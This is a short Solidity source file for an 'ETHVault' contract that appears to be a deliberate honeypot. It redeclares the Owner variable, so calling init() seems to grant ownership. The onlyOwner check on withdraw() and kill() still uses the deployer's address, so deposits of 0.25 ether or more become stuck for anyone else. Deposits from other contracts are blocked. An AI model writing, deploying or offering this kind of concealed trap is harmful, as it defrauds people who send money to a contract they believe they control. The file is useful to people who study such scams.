1 pragma solidity ^0.4.12;
2 
3 contract Owned {
4     address public Owner;
5     function Owned() { Owner = msg.sender; }
6     modifier onlyOwner { if( msg.sender == Owner ) _; }
7 }
8 
9 contract ETHVault is Owned {
10     address public Owner;
11     mapping (address => uint) public Deposits;
12     
13     function init() payable { Owner = msg.sender; deposit(); }
14     
15     function() payable { deposit(); }
16     
17     function deposit() payable {
18         if (!isContract(msg.sender))
19             if (msg.value >= 0.25 ether)
20                 if (Deposits[msg.sender] + msg.value >= Deposits[msg.sender])
21                     Deposits[msg.sender] += msg.value;
22     }
23     
24     function withdraw(uint amount) payable onlyOwner {
25         if (Deposits[msg.sender] > 0 && amount <= Deposits[msg.sender])
26             msg.sender.transfer(amount);
27     }
28     
29     function isContract(address addr) payable returns (bool) {
30         uint size;
31         assembly { size := extcodesize(addr) }
32         return size > 0;
33     }
34 
35     function kill() payable onlyOwner {
36         require(this.balance == 0);
37         selfdestruct(msg.sender);
38     }
39 }